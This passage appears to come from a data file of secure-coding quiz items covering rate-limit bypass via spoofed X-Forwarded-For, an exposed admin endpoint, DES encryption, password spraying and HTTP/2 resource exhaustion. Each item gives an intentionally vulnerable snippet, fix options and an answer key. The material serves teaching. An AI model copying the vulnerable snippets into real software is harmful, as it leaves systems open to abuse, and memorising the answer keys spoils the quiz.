        category: 'DoS / Abuse',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An API has a rate limit, but it can be bypassed by spoofing the identifier used for tracking, such as the `X-Forwarded-For` header or a user ID.',
        vulnerableCode: `// JavaScript (Node.js/Express)
// Rate limiter uses a header that the user can control.
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    keyGenerator: (req) => req.headers['x-forwarded-for'] || req.ip
});`,
        language: 'javascript',
        options: [
            {
                id: '60a',
                code: `// The primary identifier for rate limiting should be something the user cannot control, such as the true source IP address or, for authenticated routes, the user's session ID or API key.
const limiter = rateLimit({
    // ...
    keyGenerator: (req) => req.user.id || req.ip
});`
            },
            {
                id: '60b',
                code: `// Use a lower max value for the rate limit.`
            },
            {
                id: '60c',
                code: `// Ban IP addresses that exceed the rate limit.`
            },
        ],
        correctOptionId: '60a',
        explanation: 'The effectiveness of a rate limit depends entirely on the identifier used to track requests. This identifier must be reliable and not user-configurable. For authenticated users, their user ID or API key is best. For anonymous users, the source IP address is the most common (though imperfect) identifier.',
    },
    {
        id: '61',
        title: 'Privileged Endpoint Exposure (Admin API)',
        category: 'Broken Access Control',
        difficulty: 'Expert',
        xp: 95,
        description: 'An internal or admin-only API endpoint is accidentally exposed to the public internet without proper firewall rules or authentication.',
        vulnerableCode: `// A microservice for admin tasks is deployed to a public subnet.
// It has no authentication configured, assuming it will only be called by other internal services.
// e.g., http://admin-service.public.cloud/reset-all-passwords`,
        language: 'generic',
        options: [
            {
                id: '61a',
                code: `// Enforce strong authentication on the endpoint, even if it's "internal".`
            },
            {
                id: '61b',
                code: `// Use network-level controls (firewall rules, security groups, VPCs) to ensure the endpoint is only accessible from trusted internal IP ranges.`
            },
            {
                id: '61c',
                code: 'Both A and B are essential. Defense-in-depth requires both strong authentication and strict network controls for privileged endpoints.'
            },
        ],
        correctOptionId: '61c',
        explanation: 'Protecting privileged endpoints requires multiple layers. The network configuration should make it impossible for the public to even connect to the endpoint (B). Additionally, the endpoint itself should still require strong authentication in case the network controls ever fail (A).',
    },
    {
        id: '62',
        title: 'Insecure Cryptographic Practices (Weak Keys)',
        category: 'Crypto',
        difficulty: 'Advanced',
        xp: 85,
        description: 'The application uses a weak or compromised cryptographic algorithm, or uses a strong algorithm incorrectly.',
        vulnerableCode: `// Java
// Using DES, an outdated and insecure encryption standard.
Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");`,
        language: 'java',
        options: [
            {
                id: '62a',
                code: `// Use a modern, strong, and widely-accepted algorithm like AES in a secure mode like GCM.
Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");`
            },
            {
                id: '62b',
                code: `// Use a longer key with DES.`
            },
            {
                id: '62c',
                code: `// Encrypt the data twice with DES for more security.`
            },
        ],
        correctOptionId: '62a',
        explanation: 'Do not roll your own crypto. Use modern, industry-standard algorithms and modes that are recommended by cryptographic experts. For symmetric encryption, AES-256 in GCM mode is a strong, standard choice.',
    },
    {
        id: '63',
        title: 'Password Spraying / Brute Force Resilience',
        category: 'Auth',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'The login endpoint does not have any mechanism to detect or block password spraying attacks (trying a few common passwords against many user accounts).',
        vulnerableCode: `// A standard login endpoint with no account lockout or rate limiting.
app.post('/login', (req, res) => {
  // ... checks username and password
});`,
        language: 'javascript',
        options: [
            {
                id: '63a',
                code: `// Implement account lockout after a certain number of failed login attempts for a single user.`
            },
            {
                id: '63b',
                code: `// Implement IP-based rate limiting on the login endpoint.`
            },
            {
                id: '63c',
                code: `// Both A and B are needed. Account lockout stops brute-force on one account, while IP-based limiting helps slow down spraying across many accounts.`
            },
        ],
        correctOptionId: '63c',
        explanation: 'Defending against various brute-force attacks requires multiple strategies. Account lockout (A) prevents an attacker from targeting a single known account. IP-based rate limiting (B) makes it harder for a single attacker to "spray" a common password against your entire user list.',
    },
    {
        id: '64',
        title: 'Insecure Use of HTTP/2 or Protocol Misconfig',
        category: 'Protocol',
        difficulty: 'Advanced',
        xp: 75,
        description: 'An HTTP/2 server is vulnerable to a DoS attack where a client sends a stream of HEADERS frames without data, consuming server resources.',
        vulnerableCode: `// This is a server configuration vulnerability, not application code.
// E.g., an Nginx server with a low 'http2_max_concurrent_streams' limit but no limit on header processing.`,
        language: 'generic',
        options: [
            {
                id: '64a',
                code: `// Keep the web server software (e.g., Nginx, Apache) and its HTTP/2 module updated to the latest version.`
            },
            {
                id: '64b',
                code: `// Configure server-side limits on the number of concurrent streams, requests per connection, and the size of the header compression table.`
            },
            {
                id: '64c',
                code: `Both A and B are essential. Keeping the server patched (A) fixes known vulnerabilities, and proper configuration (B) hardens it against protocol-level abuse.`
            },
        ],
        correctOptionId: '64c',
        explanation: 'Protocol-level attacks are complex. The primary defenses are to use up-to-date server software that has patched known vulnerabilities (A) and to apply strict, sensible limits in your server configuration to prevent resource exhaustion (B).',
    }
];

    